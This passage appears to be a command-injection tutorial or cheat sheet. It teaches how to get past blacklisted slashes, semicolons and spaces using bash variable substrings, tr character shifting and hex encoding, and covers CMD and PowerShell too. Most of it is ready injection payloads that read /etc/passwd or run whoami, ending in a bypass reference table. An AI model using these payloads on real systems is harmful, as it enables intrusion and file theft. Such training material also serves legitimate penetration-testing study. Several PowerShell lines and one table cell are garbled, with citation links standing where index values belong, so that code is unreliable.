## Bypassing Blacklisted Characters

The slash `/` and backslash `\` are among the most impactful characters to block because they are required to specify any file path. Blocking them appears to prevent reading files or navigating directories. In practice, the shell's variable expansion and text transformation capabilities give you multiple ways to produce any character you need without writing it literally.

***

## The Core Technique: Environment Variable Substring Extraction

Bash allows you to extract a substring from any variable using `${VAR:start:length}`. Since environment variables contain real filesystem paths, they contain slashes and other useful characters that can be extracted by position. 

```bash
# View all environment variables to find useful characters
printenv

# $PATH typically looks like: /usr/local/bin:/usr/bin:/bin
echo ${PATH:0:1}    # position 0, length 1 → /
echo ${PATH:5:1}    # position 5, length 1 → l (varies by system)

# $HOME typically looks like: /home/user
echo ${HOME:0:1}    # → /

# $PWD (current directory) also starts with /
echo ${PWD:0:1}     # → /
```

Once you know `${PATH:0:1}` produces `/`, you can construct any path without a literal slash:

```bash
# cat /etc/passwd without using /
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd

# ls /var/www/html without using /
ls${IFS}${PATH:0:1}var${PATH:0:1}www${PATH:0:1}html

# In a full injection payload:
127.0.0.1%0acat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

### Finding the Semicolon via $LS_COLORS

`$LS_COLORS` is a longer variable containing colour codes for `ls` output. The character at position 10 happens to be a semicolon on most standard Linux configurations:

```bash
echo $LS_COLORS
# rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35...
#  0123456789^
#             position 10 = ;

echo ${LS_COLORS:10:1}    # → ;
```

This lets you use `${LS_COLORS:10:1}` as a semicolon injection operator when `;` itself is blacklisted:

```bash
# Semicolon via LS_COLORS, space via IFS
127.0.0.1${LS_COLORS:10:1}${IFS}whoami
# Shell receives: ping -c 1 127.0.0.1; whoami
```

The `printenv` command is your reconnaissance tool. Run it to see all available variables and scan them for the characters you need. 

***

## Character Shifting with tr

The `tr` command translates characters by mapping one range to another. The technique shifts the entire printable ASCII range up by one position, meaning you supply the character that comes immediately before your target in the ASCII table and `tr` shifts it to the target: 

```bash
# Syntax: tr '!-}' '"-~' shifts every char in range !-} up by one
echo $(tr '!-}' '"-~'<<<[)    # [ is ASCII 91, shifts to \ (ASCII 92)
echo $(tr '!-}' '"-~'<<<:)    # : is ASCII 58, shifts to ; (ASCII 59)
echo $(tr '!-}' '"-~'<<<.)    # . is ASCII 46, shifts to / (ASCII 47)
```

Reading the ASCII table (`man ascii`) gives you the exact position of any character:

```
ASCII 46 = .    → shifts to /  (ASCII 47)
ASCII 58 = :    → shifts to ;  (ASCII 59)
ASCII 91 = [    → shifts to \  (ASCII 92)
ASCII 64 = @    → shifts to A  (ASCII 65)
```

Applied to a full payload:

```bash
# Produce / via character shifting
127.0.0.1%0acat${IFS}$(tr '!-}' '"-~'<<<.)etc$(tr '!-}' '"-~'<<<.)passwd

# Produce ; as injection operator via character shifting
127.0.0.1$(tr '!-}' '"-~'<<<:)whoami
```

***

## Windows Equivalents

### CMD Substring Syntax

CMD uses `%VAR:~start,length%` notation:

```cmd
echo %HOMEPATH%        → \Users\htb-student
echo %HOMEPATH:~0,1%   → \    (first character)
echo %HOMEPATH:~6,-11% → \    (position 6, stop 11 chars from end)

echo %PROGRAMFILES:~10,1%  → space character (useful for space bypass)
```

### PowerShell Array Index

PowerShell treats strings as character arrays, accessible by index:

```powershell
$env:HOMEPATH[0]           # → \
$env:PROGRAMFILES [zwarts-sec](https://www.zwarts-sec.com/images/htb/command-injection/Command_Injections_Module_Cheat_Sheet.pdf)      # → space
$env:WINDIR [github](https://github.com/GrappleStiltskin/HTB-Academy-cheatsheets/blob/main/Command%20Injections%20Cheatsheet.md)             # → \

# Get-ChildItem to enumerate all env vars for useful characters
Get-ChildItem Env: | ForEach-Object { $_.Value } | Select-String "\\"
```

***

## Hex Encoding as a Universal Alternative

When environment variables are unpredictable or `tr` is blocked, hex encoding of the entire path bypasses character filters entirely: 

```bash
# Hex encode the path, decode and execute at runtime
cat $(echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
# \x2f = /  \x65 = e  \x74 = t  \x63 = c  (spells /etc/passwd)

# Using xxd for cleaner syntax
cat `xxd -r -p <<< 2f6574632f706173737764`

# ANSI-C quoting
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'; cat $abc
```

***

## Complete Character Bypass Reference

| Character Needed | Linux Technique | Windows CMD | PowerShell |
|-----------------|----------------|-------------|------------|
| `/` | `${PATH:0:1}` | N/A (uses `\`) | N/A |
| `\` | `$(tr '!-}' '"-~'<<<[)` | `%HOMEPATH:~0,1%` | `$env:HOMEPATH[0]` |
| `;` | `${LS_COLORS:10:1}` or `$(tr '!-}' '"-~'<<<:)` | N/A | `;` works in PS |
| space | `${IFS}` or `%09` | `%PROGRAMFILES:~10,1%` | `$env:PROGRAMFILES [zwarts-sec](https://www.zwarts-sec.com/images/htb/command-injection/Command_Injections_Module_Cheat_Sheet.pdf)` |
| Any char | `$(tr '!-}' '"-~'<<<PREV_CHAR)` | `%VAR:~pos,len%` | `$env:VAR[index]` |
| Any path | `echo -e "\x2f..."` or xxd | N/A | N/A |
